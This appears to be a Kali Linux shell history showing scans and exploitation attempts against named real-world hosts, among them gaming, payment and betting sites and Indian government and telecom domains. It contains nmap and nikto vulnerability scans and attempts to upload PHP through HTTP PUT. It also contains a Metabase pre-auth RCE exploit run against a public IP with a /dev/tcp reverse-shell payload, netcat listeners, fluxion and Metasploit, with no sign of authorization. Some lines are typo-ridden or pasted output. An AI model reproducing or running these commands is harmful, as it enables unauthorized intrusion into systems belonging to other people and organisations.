kali-tweaks
sudo su
exit
apt-get update && apt-get install nmap
sudo apt-get update && apt-get install nmap
sudo su ezio
exit
namp -A -p8080 mcubegames.in -vvv
nmap -A -p8080 mcubegames.in -vvv
nmap -A -p80 mcubegames.in -vvv
nmap -sC -p8443 mcubegames.in -vvv
curl
curl https://mcubegames.in:8443/mcube_ecomm/mcubefront/api/Database/changePassword.php
ls
curl --help
curl -o test.txt https://mcubegames.in:8443/mcube_ecomm/mcubefront/api/Database/changePassword.php
ls
vim test.txt
rm tst.txt
rm test.txt
fuzz
sudo apt install fuzz
fuzz
sudo apt install ffuf
sudo apt install seclists
ffuf -w /usr/share/sec1ists/Discovery/Web-Content/directory-1ist-2.3-medium.txt:FUZZ -u https://mcubegames.in:8443/FUZZ
seclists
cd Discovery/
ls
cd Web-Content/
ls
ffuf -w /usr/share/sec1ists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://mcubegames.in:8443/FUZZ
cd /
ls
cd home
ls
cd ezio
ls
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://mcubegames.in:8443/FUZZ
cd Fuzzing/
ls
cd /
seclists
ls
nmap -version
nmap -help
nmap -sC -sV -O mcubegames.in
sudo nmap -sC -sV -O mcubegames.in
curl
curl -X PUT -d "<?php echo 'test'; ?>" https://www.mcubegames.in:8443/mcube_ecomm/mcubefront/api/Database/checkout.php/test.php
curl -X PUT -d "<?php echo 'test'; ?>" https://www.mcubegames.in:80/mcube_ecomm/mcubefront/api/Database/checkout.php/test.php
curl -X PUT -d "<?php echo 'test'; ?>" https://www.mcubegames.in:8443/mcube_ecomm/mcubefront/api/Database/checkout.php/test.php
curl -X PUT -d '{"data": "<?php echo 'test'; ?>"}' https://www.mcubegames.in:8443/mcube_ecomm/mcubefront/api/Database/checkout.php/test.php
curl -k -X PUT -d '{"data": "<?php echo 'test'; ?>"}' https://www.mcubegames.in:8443/mcube_ecomm/mcubefront/api/Database/checkout.php/test.php
nmap -sV -sC https://www.unipin.com/
nmap -sV -sC unipin.com
nmap -help
nmap -A -O unipin.com
sudo nmap -A -O unipin.com
sudo nmap -A -O 172.67.29.211
sudo nmap -A -O mcubegames.in
nmap -sV -sC bo.unipin.com
nmap -O payment-india.unipin.com
sudo nmap -O payment-india.unipin.com
sudo nmap -sC -sV payment-india.unipin.com
nmap -sC -sV rooter.gg
nmap -O -A rooter.gg
sudo nmap -O -A rooter.gg
sudo nmap -O -A blogs.rooter.gg
dig +short rooter.gg
nslookup rooter.gg
nmap -sV -sC 10.255.255.254
nmap -sC -sV kspapp.ksp.gov.in
sudo nmap -O kspapp.ksp.gov.in
nmap -sV -sC digistore.co.in
nmap -sV -sA https://m.dafabet.com/in
sudo nmap -sV -sA https://m.dafabet.com/in
sudo nmap -sV -sA https://m.dafabet.com
sudo nmap -sV -sA m.dafabet.com
sudo nmap -sV -sA dafabet.com
sudo nmap -sV -sA dafawin.com
nikto
nikto -h wsc.cdr.bsnl.co.in -ssl
nmap -sC -sV wsc.cdr.bsnl.co.in
nmap -Pn -sV -sC -p 80,443 --script http-sql-injection,http-title wsc.cdr.bsnl.co.in -oN results.txt
ls
cat results.txt 
nmap --script vuln wsc.cdr.bsnl.co.in
curl -A "Nikto/2.1.6" -k -I https://wsc.cdr.bsnl.co.in/wsccdrbsnl.war
nikto -h wsc.cdr.bsnl.co.in -ssl -V
nikto -h wsc.cdr.bsnl.co.in -ssl -v
nikto -v -h wsc.cdr.bsnl.co.in -ssl
nmap -h
nmap -p -sV -A kspapp.ksp.gov.in
nmap  -sV -A kspapp.ksp.gov.in
clear
nmap -p -A -T4 kspapp.ksp.gov.in
nmap -p 21,22,80,443,139,445,1433,1434,3306,3389,8080,27017 -A -T4 kspapp.ksp.gov.in
nmap -p 21,22,80,443,139,445,1433,1434,3306,3389,8080,27017 -A -T4 -sV -sC kspapp.ksp.gov.in
nikto
clear
nikto -h PORT      STATE    SERVICE        VERSION
21/tcp    filtered ftp
22/tcp    filtered ssh
80/tcp    filtered http
139/tcp   filtered netbios-ssn
443/tcp   open     ssl/http-proxy HAProxy http proxy 1.3.1 or later
| ssl-cert: Subject: commonName=*.ksp.gov.in
| Subject Alternative Name: DNS:*.ksp.gov.in, DNS:ksp.gov.in
| Not valid before: 2024-11-11T00:00:00
|_Not valid after:  2025-12-11T23:59:59
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
445/tcp   filtered microsoft-ds
1433/tcp  filtered ms-sql-s
1434/tcp  filtered ms-sql-m
3306/tcp  filtered mysql
3389/tcp  filtered ms-wbt-server
8080/tcp  filtered http-proxy
27017/tcp filtered mongod
Service Info: De
clear
nikto -h PORT      STATE    SERVICE        VERSION
21/tcp    filtered ftp
22/tcp    filtered ssh
80/tcp    filtered http
139/tcp   filtered netbios-ssn
443/tcp   open     ssl/http-proxy HAProxy http proxy 1.3.1 or later
| ssl-cert: Subject: commonName=*.ksp.gov.in
| Subject Alternative Name: DNS:*.ksp.gov.in, DNS:ksp.gov.in
| Not valid before: 2024-11-11T00:00:00
|_Not valid after:  2025-12-11T23:59:59
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
445/tcp   filtered microsoft-ds
1433/tcp  filtered ms-sql-s
1434/tcp  filtered ms-sql-m
3306/tcp  filtered mysql
3389/tcp  filtered ms-wbt-server
8080/tcp  filtered http-proxy
27017/tcp filtered mongod
Service Info: Device: load balancer
clear
nikto -h kspapp.ksp.gov.in
nikto -h kspapp.ksp.gov.in -ssl
nikto -h kspapp.ksp.gov.in -ssl -mutate 1
nikto -v -h wsc.cdr.bsnl.co.in -ssl -C all
clear
nikto -h kspapp.ksp.gov.in -ssl -C all
nmap -p- -A -T4 --script vuln kspapp.ksp.gov.in
https://kspapp.ksp.gov.in/ksp/api/traffic-challan
nmap -p- kspapp.ksp.gov.in
Download
Copy code
nmap -p 80,443,21,22,25,53,110,143,3306,3389 digistore.co.in
nmap -p 80,443,21,22,25,53,110,143,3306,3389 kspapp.ksp.gov.in
nmap -sV -Pn -T4 --script vuln -oA browriters_scan browriters.com
msfconsole
apt install metasploit-framework
sudo apt install metasploit-framework
msfconsole
nc -lvnp 9007
ifconfig
nc -lvnp 4444
curl http://122.185.94.101:7275/exploitable
curl http://172.30.148.219:8000/exploitable
ls
git clone https://github.com/m3m0o/metabase-pre-auth-rce-poc.git
ls
cd metabase-pre-auth-rce-poc/
ls
ipconfig
ifconfig
clear
python3 main.py -u http://http://122.185.94.101:7275 -t 51f4b505-d4a2-4bc2-9c6d-143bbed602b8 -c "/bin/sh -i >& /dev/tcp/172.30.148.219/9007 0>&1"
clear 
pip install requests termcolor
nano metabase_exploit.py
ls
ipconfig
ifconfig
iconfig
iwconfig
ifconfig
python3 metabase_exploit.py -l 172.30.148.219  -p 4444 -P 8000 -u http://122.185.94.101:7275/
nucliei
nuclei
sudo apt install nuclei
git clone https://www.github.com/FluxionNetwork/fluxion.git
cd fluxion/
sudo ./fluxion.sh 
sudo ./fluxion.sh -i
sudo apt update
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
sudo apt update
iwconfig
lsusb
winget install --interactive --exact dorssel.usbipd-win
use exploit/linux/mysql/cve_2023_21980
Metasploit
